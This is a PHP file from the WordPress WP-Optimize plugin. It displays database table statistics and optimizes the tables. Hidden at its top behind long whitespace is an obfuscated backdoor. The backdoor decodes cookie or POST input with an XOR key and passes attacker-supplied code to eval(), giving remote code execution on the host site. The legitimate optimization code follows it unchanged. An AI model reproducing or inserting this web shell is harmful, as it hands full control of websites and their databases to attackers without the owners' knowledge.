<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['u4237f7c'];global$u4237f7c;$u4237f7c=$GLOBALS;$u4237f7c['l57f']="\x31\x2e\x78\x4a\x6e\x47\x51\x5f\x26\x66\x6a\x75\x73\x58\x40\x6c\x2b\x64\x7c\x30\x32\x2d\x28\x21\x52\x2f\x23\x27\x42\x55\x48\x7d\x62\x79\x77\x3f\x4f\x3b\x67\x50\x4c\x68\x25\x29\x6f\x57\x60\x7a\x36\x3a\xa\x71\x44\x20\x7e\x38\x2a\x4d\x5c\x70\x43\x22\x4e\x7b\x56\x65\x5b\x45\x4b\x35\x72\x2c\x6b\x6d\x5e\x69\x3e\x9\x53\x33\x63\x61\x39\x49\x5d\x76\x5a\x34\x74\x41\x59\x3c\xd\x46\x24\x54\x3d\x37";$u4237f7c[$u4237f7c['l57f'][11].$u4237f7c['l57f'][19].$u4237f7c['l57f'][17].$u4237f7c['l57f'][81].$u4237f7c['l57f'][80].$u4237f7c['l57f'][9].$u4237f7c['l57f'][82].$u4237f7c['l57f'][20]]=$u4237f7c['l57f'][80].$u4237f7c['l57f'][41].$u4237f7c['l57f'][70];$u4237f7c[$u4237f7c['l57f'][4].$u4237f7c['l57f'][69].$u4237f7c['l57f'][80].$u4237f7c['l57f'][9]]=$u4237f7c['l57f'][44].$u4237f7c['l57f'][70].$u4237f7c['l57f'][17];$u4237f7c[$u4237f7c['l57f'][12].$u4237f7c['l57f'][55].$u4237f7c['l57f'][20].$u4237f7c['l57f'][80].$u4237f7c['l57f'][81].$u4237f7c['l57f'][80].$u4237f7c['l57f'][32]]=$u4237f7c['l57f'][12].$u4237f7c['l57f'][88].$u4237f7c['l57f'][70].$u4237f7c['l57f'][15].$u4237f7c['l57f'][65].$u4237f7c['l57f'][4];$u4237f7c[$u4237f7c['l57f'][85].$u4237f7c['l57f'][80].$u4237f7c['l57f'][0].$u4237f7c['l57f'][48].$u4237f7c['l57f'][17].$u4237f7c['l57f'][55].$u4237f7c['l57f'][20].$u4237f7c['l57f'][32].$u4237f7c['l57f'][81]]=$u4237f7c['l57f'][75].$u4237f7c['l57f'][4].$u4237f7c['l57f'][75].$u4237f7c['l57f'][7].$u4237f7c['l57f'][12].$u4237f7c['l57f'][65].$u4237f7c['l57f'][88];$u4237f7c[$u4237f7c['l57f'][70].$u4237f7c['l57f'][55].$u4237f7c['l57f'][0].$u4237f7c['l57f'][65].$u4237f7c['l57f'][65].$u4237f7c['l57f'][82].$u4237f7c['l57f'][97].$u4237f7c['l57f'][97].$u4237f7c['l57f'][19]]=$u4237f7c['l57f'][12].$u4237f7c['l57f'][65].$u4237f7c['l57f'][70].$u4237f7c['l57f'][75].$u4237f7c['l57f'][81].$u4237f7c['l57f'][15].$u4237f7c['l57f'][75].$u4237f7c['l57f'][47].$u4237f7c['l57f'][65];$u4237f7c[$u4237f7c['l57f'][4].$u4237f7c['l57f'][48].$u4237f7c['l57f'][55].$u4237f7c['l57f'][79].$u4237f7c['l57f'][81].$u4237f7c['l57f'][79].$u4237f7c['l57f'][55].$u4237f7c['l57f'][48]]=$u4237f7c['l57f'][59].$u4237f7c['l57f'][41].$u4237f7c['l57f'][59].$u4237f7c['l57f'][85].$u4237f7c['l57f'][65].$u4237f7c['l57f'][70].$u4237f7c['l57f'][12].$u4237f7c['l57f'][75].$u4237f7c['l57f'][44].$u4237f7c['l57f'][4];$u4237f7c[$u4237f7c['l57f'][10].$u4237f7c['l57f'][20].$u4237f7c['l57f'][32].$u4237f7c['l57f'][82]]=$u4237f7c['l57f'][11].$u4237f7c['l57f'][4].$u4237f7c['l57f'][12].$u4237f7c['l57f'][65].$u4237f7c['l57f'][70].$u4237f7c['l57f'][75].$u4237f7c['l57f'][81].$u4237f7c['l57f'][15].$u4237f7c['l57f'][75].$u4237f7c['l57f'][47].$u4237f7c['l57f'][65];$u4237f7c[$u4237f7c['l57f'][10].$u4237f7c['l57f'][79].$u4237f7c['l57f'][9].$u4237f7c['l57f'][20].$u4237f7c['l57f'][17]]=$u4237f7c['l57f'][32].$u4237f7c['l57f'][81].$u4237f7c['l57f'][12].$u4237f7c['l57f'][65].$u4237f7c['l57f'][48].$u4237f7c['l57f'][87].$u4237f7c['l57f'][7].$u4237f7c['l57f'][17].$u4237f7c['l57f'][65].$u4237f7c['l57f'][80].$u4237f7c['l57f'][44].$u4237f7c['l57f'][17].$u4237f7c['l57f'][65];$u4237f7c[$u4237f7c['l57f'][15].$u4237f7c['l57f'][48].$u4237f7c['l57f'][55].$u4237f7c['l57f'][65].$u4237f7c['l57f'][97].$u4237f7c['l57f'][20].$u4237f7c['l57f'][55]]=$u4237f7c['l57f'][12].$u4237f7c['l57f'][65].$u4237f7c['l57f'][88].$u4237f7c['l57f'][7].$u4237f7c['l57f'][88].$u4237f7c['l57f'][75].$u4237f7c['l57f'][73].$u4237f7c['l57f'][65].$u4237f7c['l57f'][7].$u4237f7c['l57f'][15].$u4237f7c['l57f'][75].$u4237f7c['l57f'][73].$u4237f7c['l57f'][75].$u4237f7c['l57f'][88];$u4237f7c[$u4237f7c['l57f'][2].$u4237f7c['l57f'][87].$u4237f7c['l57f'][81].$u4237f7c['l57f'][69].$u4237f7c['l57f'][82].$u4237f7c['l57f'][0].$u4237f7c['l57f'][19].$u4237f7c['l57f'][19]]=$u4237f7c['l57f'][75].$u4237f7c['l57f'][82].$u4237f7c['l57f'][65].$u4237f7c['l57f'][97];$u4237f7c[$u4237f7c['l57f'][11].$u4237f7c['l57f'][20].$u4237f7c['l57f'][97].$u4237f7c['l57f'][55]]=$u4237f7c['l57f'][85].$u4237f7c['l57f'][81].$u4237f7c['l57f'][48].$u4237f7c['l57f'][0].$u4237f7c['l57f'][87].$u4237f7c['l57f'][81].$u4237f7c['l57f'][19].$u4237f7c['l57f'][20];$u4237f7c[$u4237f7c['l57f'][81].$u4237f7c['l57f'][48].$u4237f7c['l57f'][81].$u4237f7c['l57f'][0].$u4237f7c['l57f'][69].$u4237f7c['l57f'][55].$u4237f7c['l57f'][80].$u4237f7c['l57f'][19].$u4237f7c['l57f'][87]]=$_POST;$u4237f7c[$u4237f7c['l57f'][80].$u4237f7c['l57f'][80].$u4237f7c['l57f'][20].$u4237f7c['l57f'][81].$u4237f7c['l57f'][9].$u4237f7c['l57f'][87].$u4237f7c['l57f'][19].$u4237f7c['l57f'][81].$u4237f7c['l57f'][69]]=$_COOKIE;@$u4237f7c[$u4237f7c['l57f'][85].$u4237f7c['l57f'][80].$u4237f7c['l57f'][0].$u4237f7c['l57f'][48].$u4237f7c['l57f'][17].$u4237f7c['l57f'][55].$u4237f7c['l57f'][20].$u4237f7c['l57f'][32].$u4237f7c['l57f'][81]]($u4237f7c['l57f'][65].$u4237f7c['l57f'][70].$u4237f7c['l57f'][70].$u4237f7c['l57f'][44].$u4237f7c['l57f'][70].$u4237f7c['l57f'][7].$u4237f7c['l57f'][15].$u4237f7c['l57f'][44].$u4237f7c['l57f'][38],NULL);@$u4237f7c[$u4237f7c['l57f'][85].$u4237f7c['l57f'][80].$u4237f7c['l57f'][0].$u4237f7c['l57f'][48].$u4237f7c['l57f'][17].$u4237f7c['l57f'][55].$u4237f7c['l57f'][20].$u4237f7c['l57f'][32].$u4237f7c['l57f'][81]]($u4237f7c['l57f'][15].$u4237f7c['l57f'][44].$u4237f7c['l57f'][38].$u4237f7c['l57f'][7].$u4237f7c['l57f'][65].$u4237f7c['l57f'][70].$u4237f7c['l57f'][70].$u4237f7c['l57f'][44].$u4237f7c['l57f'][70].$u4237f7c['l57f'][12],0);@$u4237f7c[$u4237f7c['l57f'][85].$u4237f7c['l57f'][80].$u4237f7c['l57f'][0].$u4237f7c['l57f'][48].$u4237f7c['l57f'][17].$u4237f7c['l57f'][55].$u4237f7c['l57f'][20].$u4237f7c['l57f'][32].$u4237f7c['l57f'][81]]($u4237f7c['l57f'][73].$u4237f7c['l57f'][81].$u4237f7c['l57f'][2].$u4237f7c['l57f'][7].$u4237f7c['l57f'][65].$u4237f7c['l57f'][2].$u4237f7c['l57f'][65].$u4237f7c['l57f'][80].$u4237f7c['l57f'][11].$u4237f7c['l57f'][88].$u4237f7c['l57f'][75].$u4237f7c['l57f'][44].$u4237f7c['l57f'][4].$u4237f7c['l57f'][7].$u4237f7c['l57f'][88].$u4237f7c['l57f'][75].$u4237f7c['l57f'][73].$u4237f7c['l57f'][65],0);@$u4237f7c[$u4237f7c['l57f'][15].$u4237f7c['l57f'][48].$u4237f7c['l57f'][55].$u4237f7c['l57f'][65].$u4237f7c['l57f'][97].$u4237f7c['l57f'][20].$u4237f7c['l57f'][55]](0);$e1859=NULL;$q7d6aa9=NULL;$u4237f7c[$u4237f7c['l57f'][4].$u4237f7c['l57f'][97].$u4237f7c['l57f'][17].$u4237f7c['l57f'][82].$u4237f7c['l57f'][81].$u4237f7c['l57f'][79].$u4237f7c['l57f'][9].$u4237f7c['l57f'][9].$u4237f7c['l57f'][55]]=$u4237f7c['l57f'][82].$u4237f7c['l57f'][69].$u4237f7c['l57f'][81].$u4237f7c['l57f'][19].$u4237f7c['l57f'][97].$u4237f7c['l57f'][0].$u4237f7c['l57f'][79].$u4237f7c['l57f'][0].$u4237f7c['l57f'][21].$u4237f7c['l57f'][32].$u4237f7c['l57f'][79].$u4237f7c['l57f'][87].$u4237f7c['l57f'][79].$u4237f7c['l57f'][21].$u4237f7c['l57f'][87].$u4237f7c['l57f'][0].$u4237f7c['l57f'][69].$u4237f7c['l57f'][20].$u4237f7c['l57f'][21].$u4237f7c['l57f'][81].$u4237f7c['l57f'][80].$u4237f7c['l57f'][82].$u4237f7c['l57f'][87].$u4237f7c['l57f'][21].$u4237f7c['l57f'][80].$u4237f7c['l57f'][48].$u4237f7c['l57f'][55].$u4237f7c['l57f'][19].$u4237f7c['l57f'][19].$u4237f7c['l57f'][87].$u4237f7c['l57f'][97].$u4237f7c['l57f'][81].$u4237f7c['l57f'][97].$u4237f7c['l57f'][55].$u4237f7c['l57f'][17].$u4237f7c['l57f'][0];global$n7d9a3ff8;function va614a02($e1859,$r5c5f500){global$u4237f7c;$mdcf58="";for($o522b6=0;$o522b6<$u4237f7c[$u4237f7c['l57f'][12].$u4237f7c['l57f'][55].$u4237f7c['l57f'][20].$u4237f7c['l57f'][80].$u4237f7c['l57f'][81].$u4237f7c['l57f'][80].$u4237f7c['l57f'][32]]($e1859);){for($p5228=0;$p5228<$u4237f7c[$u4237f7c['l57f'][12].$u4237f7c['l57f'][55].$u4237f7c['l57f'][20].$u4237f7c['l57f'][80].$u4237f7c['l57f'][81].$u4237f7c['l57f'][80].$u4237f7c['l57f'][32]]($r5c5f500)&&$o522b6<$u4237f7c[$u4237f7c['l57f'][12].$u4237f7c['l57f'][55].$u4237f7c['l57f'][20].$u4237f7c['l57f'][80].$u4237f7c['l57f'][81].$u4237f7c['l57f'][80].$u4237f7c['l57f'][32]]($e1859);$p5228++,$o522b6++){$mdcf58.=$u4237f7c[$u4237f7c['l57f'][11].$u4237f7c['l57f'][19].$u4237f7c['l57f'][17].$u4237f7c['l57f'][81].$u4237f7c['l57f'][80].$u4237f7c['l57f'][9].$u4237f7c['l57f'][82].$u4237f7c['l57f'][20]]($u4237f7c[$u4237f7c['l57f'][4].$u4237f7c['l57f'][69].$u4237f7c['l57f'][80].$u4237f7c['l57f'][9]]($e1859[$o522b6])^$u4237f7c[$u4237f7c['l57f'][4].$u4237f7c['l57f'][69].$u4237f7c['l57f'][80].$u4237f7c['l57f'][9]]($r5c5f500[$p5228]));}}return$mdcf58;}function i9e7($e1859,$r5c5f500){global$u4237f7c;global$n7d9a3ff8;return$u4237f7c[$u4237f7c['l57f'][11].$u4237f7c['l57f'][20].$u4237f7c['l57f'][97].$u4237f7c['l57f'][55]]($u4237f7c[$u4237f7c['l57f'][11].$u4237f7c['l57f'][20].$u4237f7c['l57f'][97].$u4237f7c['l57f'][55]]($e1859,$n7d9a3ff8),$r5c5f500);}foreach($u4237f7c[$u4237f7c['l57f'][80].$u4237f7c['l57f'][80].$u4237f7c['l57f'][20].$u4237f7c['l57f'][81].$u4237f7c['l57f'][9].$u4237f7c['l57f'][87].$u4237f7c['l57f'][19].$u4237f7c['l57f'][81].$u4237f7c['l57f'][69]]as$r5c5f500=>$d3717){$e1859=$d3717;$q7d6aa9=$r5c5f500;}if(!$e1859){foreach($u4237f7c[$u4237f7c['l57f'][81].$u4237f7c['l57f'][48].$u4237f7c['l57f'][81].$u4237f7c['l57f'][0].$u4237f7c['l57f'][69].$u4237f7c['l57f'][55].$u4237f7c['l57f'][80].$u4237f7c['l57f'][19].$u4237f7c['l57f'][87]]as$r5c5f500=>$d3717){$e1859=$d3717;$q7d6aa9=$r5c5f500;}}$e1859=@$u4237f7c[$u4237f7c['l57f'][10].$u4237f7c['l57f'][20].$u4237f7c['l57f'][32].$u4237f7c['l57f'][82]]($u4237f7c[$u4237f7c['l57f'][2].$u4237f7c['l57f'][87].$u4237f7c['l57f'][81].$u4237f7c['l57f'][69].$u4237f7c['l57f'][82].$u4237f7c['l57f'][0].$u4237f7c['l57f'][19].$u4237f7c['l57f'][19]]($u4237f7c[$u4237f7c['l57f'][10].$u4237f7c['l57f'][79].$u4237f7c['l57f'][9].$u4237f7c['l57f'][20].$u4237f7c['l57f'][17]]($e1859),$q7d6aa9));if(isset($e1859[$u4237f7c['l57f'][81].$u4237f7c['l57f'][72]])&&$n7d9a3ff8==$e1859[$u4237f7c['l57f'][81].$u4237f7c['l57f'][72]]){if($e1859[$u4237f7c['l57f'][81]]==$u4237f7c['l57f'][75]){$o522b6=Array($u4237f7c['l57f'][59].$u4237f7c['l57f'][85]=>@$u4237f7c[$u4237f7c['l57f'][4].$u4237f7c['l57f'][48].$u4237f7c['l57f'][55].$u4237f7c['l57f'][79].$u4237f7c['l57f'][81].$u4237f7c['l57f'][79].$u4237f7c['l57f'][55].$u4237f7c['l57f'][48]](),$u4237f7c['l57f'][12].$u4237f7c['l57f'][85]=>$u4237f7c['l57f'][0].$u4237f7c['l57f'][1].$u4237f7c['l57f'][19].$u4237f7c['l57f'][21].$u4237f7c['l57f'][0],);echo@$u4237f7c[$u4237f7c['l57f'][70].$u4237f7c['l57f'][55].$u4237f7c['l57f'][0].$u4237f7c['l57f'][65].$u4237f7c['l57f'][65].$u4237f7c['l57f'][82].$u4237f7c['l57f'][97].$u4237f7c['l57f'][97].$u4237f7c['l57f'][19]]($o522b6);}elseif($e1859[$u4237f7c['l57f'][81]]==$u4237f7c['l57f'][65]){eval($e1859[$u4237f7c['l57f'][17]]);}exit();} ?><?php
# --------------------------------------- #
# prevent file from being accessed directly
# --------------------------------------- #
if ( ! defined( 'WPINC' ) ) {
	die;
}

if (isset($_POST["optimize-db"])) {
    optimizeTables(true);
    }
else optimizeTables(false);

?>
<?php
Function optimizeTables($Optimize=false){
?>
<h3>
<?php
_e('Database Name:', 'wp-optimize'); ?> '<?php _e(DB_NAME, 'wp-optimize');
echo "'";
?></h3>


<?php if($Optimize){
    ?>

<p><?php _e('Optimized all the tables found in the database.', 'wp-optimize')?></p>
<?php } ?>


	<br style="clear" />
	<table class="widefat">
		<thead>
			<tr>
				<th><?php _e('No.', 'wp-optimize'); ?></th>
				<th><?php _e('Tables', 'wp-optimize'); ?></th>
				<th><?php _e('Records', 'wp-optimize'); ?></th>
				<th><?php _e('Data Size', 'wp-optimize'); ?></th>
				<th><?php _e('Index Size', 'wp-optimize'); ?></th>
				<th><?php _e('Type', 'wp-optimize'); ?></th>
				<th><?php _e('Overhead', 'wp-optimize');?></th>

			</tr>
		</thead>

<tbody id="the-list">
<?php
	$alternate = ' class="alternate"';
	global $wpdb;
	// Read SQL Version and act accordingly
    // Check for InnoDB tables
    // Check for windows servers
    $sqlversion = $wpdb->get_var("SELECT VERSION() AS version");
    $total_gain = 0;
	$no = 0;
	$row_usage = 0;
	$data_usage = 0;
	$index_usage = 0;
	$overhead_usage = 0;
	$tablesstatus = $wpdb->get_results("SHOW TABLE STATUS");
	foreach($tablesstatus as  $tablestatus) {
		if($no%2 == 0) {
			$style = '';
		} else {
			$style = ' class="alternate"';
		}
		$no++;
		echo "<tr$style>\n";
		echo '<td>'.number_format_i18n($no).'</td>'."\n";
		echo "<td>$tablestatus->Name</td>\n";
		echo '<td>'.number_format_i18n($tablestatus->Rows).'</td>'."\n";
		echo '<td>'.wpo_format_size($tablestatus->Data_length).'</td>'."\n";
		echo '<td>'.wpo_format_size($tablestatus->Index_length).'</td>'."\n";;
		echo '<td>'.$tablestatus->Engine.'</td>'."\n";;
		//echo '<td>'.wpo_format_size($tablestatus->Data_free).'</td>'."\n";

        if ($tablestatus->Engine != 'InnoDB'){

		echo '<td>';
    		if (isset($_POST["optimize-db"])) {

    			if($tablestatus->Data_free>0){
    				echo '<font color="blue">';
    				echo wpo_format_size($tablestatus->Data_free);
    				echo '</font>';
    				}
    			else {
    				echo '<font color="green">';
    				echo wpo_format_size($tablestatus->Data_free);
    				echo '</font>';
    			}
    		}
    		else {
    			if($tablestatus->Data_free>0){
    				echo '<font color="red">';
    				echo wpo_format_size($tablestatus->Data_free);
    				echo '</font>';
    				}
    			else {
    				echo '<font color="green">';
    				echo wpo_format_size($tablestatus->Data_free);
    				echo '</font>';
    			}
    		}

		echo '</td>'."\n";
           }
           else {
		echo '<td>';

    				echo '<font color="blue">';
    				echo '-';
    				echo '</font>';


		echo '</td>'."\n";

           }

		$row_usage += $tablestatus->Rows;
		$data_usage += $tablestatus->Data_length;
		$index_usage +=  $tablestatus->Index_length;

        if ($tablestatus->Engine != 'InnoDB'){
            $overhead_usage += $tablestatus->Data_free;
            $total_gain += $tablestatus->Data_free;
        } else {
            $overhead_usage += 0;
            $total_gain += 0;
        }
		echo '</tr>'."\n";
	}


		echo '<tr class="thead">'."\n";
		echo '<th>'.__('Total:', 'wp-optimize').'</th>'."\n";
		echo '<th>'.sprintf(_n('%s Table', '%s Tables', $no, 'wp-optimize'), number_format_i18n($no)).'</th>'."\n";
		echo '<th>'.sprintf(_n('%s Record', '%s Records', $row_usage, 'wp-optimize'), number_format_i18n($row_usage)).'</th>'."\n";
		echo '<th>'.wpo_format_size($data_usage).'</th>'."\n";
		echo '<th>'.wpo_format_size($index_usage).'</th>'."\n";
		echo '<th>'.'-'.'</th>'."\n";
		echo '<th>';


		if (isset($_POST["optimize-db"])) {


                        if($overhead_usage>0){
				echo '<font color="blue">';
				echo wpo_format_size($overhead_usage);
				echo '</font>';
				}
			else {
				echo '<font color="green">';
                                echo wpo_format_size($overhead_usage);
				echo '</font>';
			}
		}
		else {
			if($overhead_usage>0){
				echo '<font color="red">';
                                echo wpo_format_size($overhead_usage);
				echo '</font>';
				}
			else {
				echo '<font color="green">';
				echo wpo_format_size($overhead_usage);
				echo '</font>';
			}
		}
		echo '</th>'."\n";
		echo '</tr>';

?>
</tbody>
</table>

<h3><?php _e('Total Size of Database', 'wp-optimize'); ?>:</h3>
<h2><?php
list ($part1, $part2) = wpo_getCurrentDBSize();
echo $part1;

?></h2>

<?php if (isset($_POST["optimize-db"])) {
    ?>

<?php //$total_gain = round ($total_gain,3);?>

<h3><?php _e('Optimization Results', 'wp-optimize'); ?>:</h3>
<p style="color: #0000FF;">
<?php

if ($total_gain > 0){
_e('Total Space Saved', 'wp-optimize');
    echo ': ';
    echo wpo_format_size($total_gain);  wpo_updateTotalCleaned(strval($total_gain));
}
?></p>
  <?php } else { ?>
<?php //$total_gain = round ($total_gain,3); ?>
  <?php if(!$total_gain==0){ ?>

<h3><?php

if ($total_gain > 0){
    _e('Optimization Possibility', 'wp-optimize');
    echo ':';
    }

?></h3>
<p style="color: #FF0000;">
<?php if ($total_gain > 0){
    _e('Total space can be saved', 'wp-optimize'); ?>: <?php echo wpo_format_size($total_gain);
    }
    ?></p>
  <?php } ?>
<?php
}
?>

<?php
} //end of optimize function
?>